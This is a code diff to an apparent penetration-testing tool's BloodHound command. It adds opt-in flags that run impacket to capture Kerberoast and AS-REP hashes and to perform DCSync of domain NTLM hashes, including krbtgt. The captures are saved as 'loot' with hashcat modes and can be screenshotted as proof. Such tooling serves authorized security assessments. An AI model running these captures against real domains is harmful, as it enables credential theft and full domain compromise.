@@ -2433,6 +2433,11 @@ def cmd_bloodhound(args: argparse.Namespace) -> int:
         for cp in certipy_paths:
             analysis["findings"].extend(adcs.findings(cp))
 
+    # Optional LIVE Kerberos capture (roast / AS-REP / DCSync): run the published
+    # impacket tools to grab the real hashes and fold each capture in as a proven
+    # finding before we sort + fold into the totals.
+    _ad_live_kerberos(args, bh, creds, sh_paths, analysis)
+
     # Re-sort merged findings, fill in the operator's credentials, refresh stats.
     order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
     analysis["findings"].sort(key=lambda f: order.get(f["severity"], 5))
@@ -2551,6 +2556,83 @@ def cmd_bloodhound(args: argparse.Namespace) -> int:
     else:
         print("    -> Nothing to import (no AD findings or paths in the input).")
     return 0
+
+
+def _ad_shot(args, name, command, output):
+    """Render a terminal-output proof screenshot of a live Kerberos capture into
+    engagement/screenshots/. Returns the saved path or None."""
+    if not getattr(args, "screenshots", False):
+        return None
+    from . import mssql, screenshot
+    if not screenshot.available():
+        return None
+    png = screenshot.capture_html(mssql.proof_html(command, output, prompt="# "))
+    if not png:
+        return None
+    shot_dir = os.path.join(args.output_dir, "screenshots")
+    os.makedirs(shot_dir, exist_ok=True)
+    path = os.path.join(shot_dir, f"ad_{name}.png")
+    with open(path, "wb") as fh:
+        fh.write(png)
+    print(f"      [+] proof screenshot -> {path}")
+    return path
+
+
+def _ad_live_kerberos(args, bh, creds, sh_paths, analysis):
+    """Run the opted-in live Kerberos captures, fold the proven findings into the
+    analysis, write the captured hashes to engagement/loot/, and screenshot each."""
+    do_roast = getattr(args, "roast", False)
+    do_asrep = getattr(args, "asrep", False)
+    do_dcsync = getattr(args, "dcsync", False)
+    if not (do_roast or do_asrep or do_dcsync):
+        return
+    if not (creds and creds.get("secret")):
+        print("[!] --roast/--asrep/--dcsync need credentials (-u/-p or --creds) - skipped.")
+        return
+    if not creds.get("dc_ip"):
+        print("[!] --roast/--asrep/--dcsync need --dc-ip (airgapped: no DNS) - skipped.")
+        return
+    graph = None
+    if sh_paths:
+        try:
+            graph = bh.load_graph(sh_paths[0])
+        except Exception:  # noqa: BLE001 - a bad graph never blocks the live run
+            graph = None
+    print("[*] Live Kerberos capture (read-only ticket requests / replication)...")
+    live = bh.live_kerberos(creds, graph, do_roast=do_roast,
+                            do_asrep=do_asrep, do_dcsync=do_dcsync)
+    loot_dir = os.path.join(args.output_dir, "loot")
+    for kind, fname, mode in (("kerberoast", "kerberoast.hash", 13100),
+                              ("asrep", "asrep.hash", 18200),
+                              ("dcsync", "secretsdump.txt", None)):
+        run = live["runs"].get(kind)
+        if not run:
+            continue
+        if run.get("error"):
+            print(f"      [!] {kind}: {run['error']}")
+            continue
+        n = len(run.get("hashes", []))
+        if kind == "dcsync":
+            print(f"      [+] DCSync replicated {n} account hash(es)")
+            if run.get("output"):
+                os.makedirs(loot_dir, exist_ok=True)
+                with open(os.path.join(loot_dir, fname), "w") as fh:
+                    fh.write(run["output"])
+                print(f"          loot -> {os.path.join(loot_dir, fname)}")
+        else:
+            print(f"      [+] {kind}: captured {n} hash(es) (hashcat -m {mode})")
+            if run.get("hashes"):
+                os.makedirs(loot_dir, exist_ok=True)
+                with open(os.path.join(loot_dir, fname), "w") as fh:
+                    fh.write("\n".join(h["hash"] for h in run["hashes"]) + "\n")
+                print(f"          loot -> {os.path.join(loot_dir, fname)}")
+        if run.get("output"):
+            _ad_shot(args, kind, run.get("command", kind), run["output"])
+    if live["findings"]:
+        analysis["findings"].extend(live["findings"])
+        analysis["stats"]["findings"] = len(analysis["findings"])
+        print(f"    -> {len(live['findings'])} proven capture(s) folded into the "
+              "findings + main totals.")
 
 
 def _mssql_shot(args, ip, name, banner, command, output):
@@ -3505,6 +3587,19 @@ def build_arg_parser() -> argparse.ArgumentParser:
                      help="clear previously-imported AD/ESC findings on the DC host "
                           "before folding this import, so remediated items disappear "
                           "(default: accumulate across imports)")
+    bhp.add_argument("--roast", action="store_true",
+                     help="LIVE: run impacket-GetUserSPNs -request to capture real "
+                          "TGS-REP (Kerberoast) hashes (needs creds + --dc-ip)")
+    bhp.add_argument("--asrep", action="store_true",
+                     help="LIVE: run impacket-GetNPUsers -request to capture real "
+                          "AS-REP hashes for pre-auth-disabled accounts")
+    bhp.add_argument("--dcsync", action="store_true",
+                     help="LIVE: run impacket-secretsdump -just-dc to replicate the "
+                          "domain NTLM hashes (incl. krbtgt) - only if the account "
+                          "holds replication rights")
+    bhp.add_argument("--screenshots", action="store_true",
+                     help="save terminal-output proof screenshots of the live "
+                          "captures into engagement/screenshots/")
     bhp.add_argument("-o", "--output-dir", default="engagement")
     bhp.add_argument("--title", default="Recce Engagement")
     bhp.set_defaults(func=cmd_bloodhound)
